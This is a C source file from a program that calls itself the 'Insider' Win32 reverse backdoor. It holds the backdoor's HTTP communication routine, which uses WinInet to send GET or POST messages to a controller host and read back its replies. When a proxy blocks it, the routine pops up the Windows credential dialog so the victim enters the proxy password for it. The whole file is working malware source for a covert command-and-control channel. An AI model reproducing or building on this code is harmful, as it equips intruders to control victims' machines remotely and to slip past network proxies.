

/* Insider -- Win32 reverse backdoor */


#include "insider.h"

#define SD_BOTH 2

/* Send http message and return pointer to data */

char *send_msg (char *addr, char *msg, char *host, int port, int method) {
	int 		sd, rc, used, bytes;
	char 		*buf;
	HINTERNET 	hOpenHandle, hResourceHandle, hConnectHandle;
	DWORD 		dwError, dwErrorCode, dwStatus, dwSize, dwDownloaded;
	DWORD 		dwStatusSize = sizeof(dwStatus);


	/* Reset the retry switch */
	retry = 0;


	/* Prepare for the internet connection */
	hOpenHandle = InternetOpen(User_agent, INTERNET_OPEN_TYPE_PRECONFIG,
		NULL, NULL, 0);
	if (hOpenHandle == NULL)
		return NULL;


	/* Connect to server */
	hConnectHandle = InternetConnect(hOpenHandle, host, 
                                 (INTERNET_PORT)port, NULL,
                                 NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (hConnectHandle == NULL) {
		InternetCloseHandle(hOpenHandle);
		return NULL;
	}

	
	/* Check out the http connection method */
	switch (method) {

	case HTTP_METHOD_GET:
	  /* Set url and http method */
	  hResourceHandle = HttpOpenRequest(hConnectHandle, "GET",
                                  addr, NULL, NULL, NULL, 
                                  INTERNET_FLAG_KEEP_CONNECTION |
				  INTERNET_FLAG_PRAGMA_NOCACHE |
				  INTERNET_FLAG_NO_CACHE_WRITE, 0);
	  if (hResourceHandle == NULL) {
		InternetCloseHandle(hConnectHandle);
		InternetCloseHandle(hOpenHandle);
		return NULL;
	  }
	  /* Send data */
	  HttpSendRequest(hResourceHandle, NULL, 0, NULL, 0);
	  break;

	case HTTP_METHOD_POST:
	  /* Set url and http method */
	  hResourceHandle = HttpOpenRequest(hConnectHandle, "POST",
                                  addr, NULL, NULL, NULL, 
                                  INTERNET_FLAG_KEEP_CONNECTION |
				  INTERNET_FLAG_PRAGMA_NOCACHE |
				  INTERNET_FLAG_NO_CACHE_WRITE, 0);
	  if (hResourceHandle == NULL) {
		InternetCloseHandle(hConnectHandle);
		InternetCloseHandle(hOpenHandle);
		return NULL;
	  }
	  /* Send data */
	  HttpSendRequest(hResourceHandle, NULL, 0, msg, strlen(msg));
	  break;

	}

	/* Query http status code */
	HttpQueryInfo(hResourceHandle, HTTP_QUERY_FLAG_NUMBER | 
              HTTP_QUERY_STATUS_CODE, &dwStatus, &dwStatusSize, NULL);

	/* Check out the status */
	switch (dwStatus) {
	  case HTTP_STATUS_PROXY_AUTH_REQ:

		/* Ask user the proxy password.. It may sound stupid, but
		 * I have no idea how to do this other way.. And probably the
		 * user is used to it anyway...
		 *
		 * Sleep some time before proceeding
		 */
		_sleep(INITIAL * 1000);

		dwErrorCode = hResourceHandle ? ERROR_SUCCESS : GetLastError();
		dwError = InternetErrorDlg(GetDesktopWindow(), hResourceHandle, 
			   dwErrorCode, 
                           FLAGS_ERROR_UI_FILTER_FOR_ERRORS | 
                           FLAGS_ERROR_UI_FLAGS_CHANGE_OPTIONS |
                           FLAGS_ERROR_UI_FLAGS_GENERATE_DATA,
                           NULL);

		/* Return to main loop.. next time we should have the auth */
		InternetCloseHandle(hResourceHandle);
		InternetCloseHandle(hConnectHandle);
		InternetCloseHandle(hOpenHandle);
		http_status = dwStatus;
		retry = 1;
		return NULL;
		break;

	  default:
		/* Just set the status... */
		http_status = dwStatus;
		break;
		
	}

	/* Get response */
	buf = (char *)malloc(1024);
	used = 0;
	while (1) {
		/* Read the file in 1k chunks */
		if (!InternetReadFile(hResourceHandle, &buf[used],
				1024, &dwDownloaded)) {
			free(buf);
			InternetCloseHandle(hResourceHandle);
			InternetCloseHandle(hConnectHandle);
			InternetCloseHandle(hOpenHandle);
			return NULL;
	
		}
		if (dwDownloaded == 0)
			break;
		used += dwDownloaded;
		buf = (char *)realloc(buf, used + 1024);
	}

	/* Return data */
	buf[used]='\0';
	http_len = used;
	InternetCloseHandle(hResourceHandle);
	InternetCloseHandle(hConnectHandle);
	InternetCloseHandle(hOpenHandle);
	return buf;
}
